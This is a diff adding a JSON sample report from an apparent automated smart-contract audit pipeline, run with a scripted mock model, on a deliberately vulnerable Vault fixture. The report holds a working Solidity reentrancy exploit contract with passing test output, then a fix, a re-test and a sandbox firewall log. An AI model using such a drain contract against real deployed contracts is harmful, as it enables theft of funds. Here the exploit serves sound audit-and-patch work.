@@ -1,0 +1,293 @@
+{
+  "run_id": "sample-vulnerable-vault",
+  "repo": "/root/redline/fixtures/vulnerable-vault",
+  "provider": "mock",
+  "findings": [
+    {
+      "finding": {
+        "id": "F1",
+        "title": "Reentrancy in Vault.withdraw",
+        "severity": "high",
+        "file": "src/Vault.sol",
+        "function": "withdraw",
+        "description": "withdraw() sends ETH before updating balances[msg.sender], so a contract can re-enter withdraw() and drain the vault.",
+        "attack": "Deposit 1 ETH, call withdraw(1 ether); in receive() call withdraw again while balances is not yet decremented.",
+        "confidence": 0.9
+      },
+      "citations": [],
+      "poc": {
+        "confirmed": true,
+        "attempts": 1,
+        "test_file": "test/Exploit_F1.t.sol",
+        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract Attacker {\n    Vault v;\n    constructor(Vault _v) { v = _v; }\n    function attack() external payable {\n        v.deposit{value: 1 ether}();\n        v.withdraw(1 ether);\n    }\n    receive() external payable {\n        if (address(v).balance >= 1 ether) v.withdraw(1 ether);\n    }\n}\n\ncontract ExploitF1 is Test {\n    function test_exploit() public {\n        Vault v = new Vault();\n        vm.deal(address(0xB0B), 10 ether);\n        vm.prank(address(0xB0B));\n        v.deposit{value: 10 ether}();\n        Attacker a = new Attacker(v);\n        vm.deal(address(a), 1 ether);\n        a.attack{value: 0}();\n        assertGt(address(a).balance, 1 ether);\n    }\n}\n",
+        "output": "[PASS] ExploitF1.test_exploit()",
+        "note": ""
+      },
+      "patch": {
+        "applied": true,
+        "attempts": 1,
+        "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,11 +11,9 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n+        balances[msg.sender] -= amount;\n         (bool ok,) = msg.sender.call{value: amount}(\"\");\n         require(ok, \"transfer failed\");\n-        unchecked {\n-            balances[msg.sender] -= amount;\n-        }\n     }\n \n     function totalAssets() external view returns (uint256) {\n",
+        "poc_blocked": true,
+        "suite_green": true,
+        "output": "{\"test/Vault.t.sol:VaultTest\":{\"duration\":\"56ms 346\u00b5s 878ns\",\"test_results\":{\"test_CannotOverdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":86944}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"11ms 141\u00b5s 189ns\",\"breakpoints\":{},\"gas_snapshots\":{}},\"test_DepositWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":112858}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"2ms 474\u00b5s 572ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+        "note": "Checks-effects-interactions"
+      },
+      "status": "confirmed"
+    }
+  ],
+  "quarantined": [],
+  "quarantine_files": {},
+  "firewall_log": [
+    {
+      "ts": 1792837404.0835373,
+      "kind": "shell",
+      "action": "forge test",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 0.25,
+      "provider": ""
+    },
+    {
+      "ts": 1792837410.0452178,
+      "kind": "read",
+      "action": "README.md",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 3.37,
+      "provider": ""
+    },
+    {
+      "ts": 1792837410.0582266,
+      "kind": "read",
+      "action": "foundry.toml",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 0.26,
+      "provider": ""
+    },
+    {
+      "ts": 1792837410.0590646,
+      "kind": "read",
+      "action": "src/Vault.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 0.12,
+      "provider": ""
+    },
+    {
+      "ts": 1792837410.070223,
+      "kind": "read",
+      "action": "test/Vault.t.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 0.23,
+      "provider": ""
+    },
+    {
+      "ts": 1792837410.0967686,
+      "kind": "write",
+      "action": "test/Exploit_F1.t.sol (777B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 4.9,
+      "provider": ""
+    },
+    {
+      "ts": 1792837410.1026454,
+      "kind": "shell",
+      "action": "forge test --match-path test/Exploit_F1.t.sol --match-test test_exploit",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 2.96,
+      "provider": ""
+    },
+    {
+      "ts": 1792837424.030384,
+      "kind": "read",
+      "action": "src/Vault.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "read-ok",
+      "reason": "read inside jail",
+      "confidence": 1.0,
+      "latency_ms": 14.11,
+      "provider": ""
+    },
+    {
+      "ts": 1792837424.0489693,
+      "kind": "write",
+      "action": "src/Vault.sol (618B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 3.54,
+      "provider": ""
+    },
+    {
+      "ts": 1792837424.0535052,
+      "kind": "write",
+      "action": "src/Vault.sol (618B)",
+      "verdict": "allow",
+      "layer": "L2",
+      "rule": "nemotron-policy",
+      "reason": "scripted allow",
+      "confidence": 1.0,
+      "latency_ms": 2.25,
+      "provider": "mock"
+    },
+    {
+      "ts": 1792837424.0607038,
+      "kind": "shell",
+      "action": "forge test --match-path test/Exploit_F1.t.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 3.99,
+      "provider": ""
+    },
+    {
+      "ts": 1792837428.8203804,
+      "kind": "shell",
+      "action": "forge test --no-match-path test/Exploit_F1.t.sol",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "allowlist",
+      "reason": "forge allowed",
+      "confidence": 1.0,
+      "latency_ms": 31.07,
+      "provider": ""
+    },
+    {
+      "ts": 1792837438.64161,
+      "kind": "write",
+      "action": "src/Vault.sol (652B)",
+      "verdict": "allow",
+      "layer": "L1",
+      "rule": "write-ok",
+      "reason": "write inside jail",
+      "confidence": 1.0,
+      "latency_ms": 17.76,
+      "provider": ""
+    },
+    {
+      "ts": 1792837438.6770868,
+      "kind": "write",
+      "action": "src/Vault.sol (652B)",
+      "verdict": "allow",
+      "layer": "L2",
+      "rule": "nemotron-policy",
+      "reason": "scripted allow",
+      "confidence": 1.0,
+      "latency_ms": 4.71,
+      "provider": "mock"
+    }
+  ],
+  "calls": [
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-nano-3-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 0.0017594406381249428
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-nano-3-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 2.094171941280365e-05
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-nano-3-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 3.867689520120621e-05
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-nano-3-30b-a3b",
+      "role": "scanner",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 1.4632008969783783e-05
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-3-super-120b-a12b",
+      "role": "recon",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 0.0011225054040551186
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-3-super-120b-a12b",
+      "role": "exploit",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 0.0006710439920425415
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-3-super-120b-a12b",
+      "role": "patch",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 0.0017852522432804108
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-nano-3-30b-a3b",
+      "role": "policy",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 0.000521327368915081
+    },
+    {
+      "provider": "mock",
+      "model": "nvidia/nemotron-nano-3-30b-a3b",
+      "role": "policy",
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "latency_s": 0.001188604161143303
+    }
+  ],
+  "baseline_green": true,
+  "elapsed_s": 34.643985729664564,
+  "out_dir": "/root/redline/samples/sample-vulnerable-vault",
+  "scripted": true,
+  "label": "SAMPLE - scripted model",
+  "models": {
+    "main": "nvidia/nemotron-3-super-120b-a12b",
+    "firewall": "nvidia/nemotron-nano-3-30b-a3b"
+  }
+}
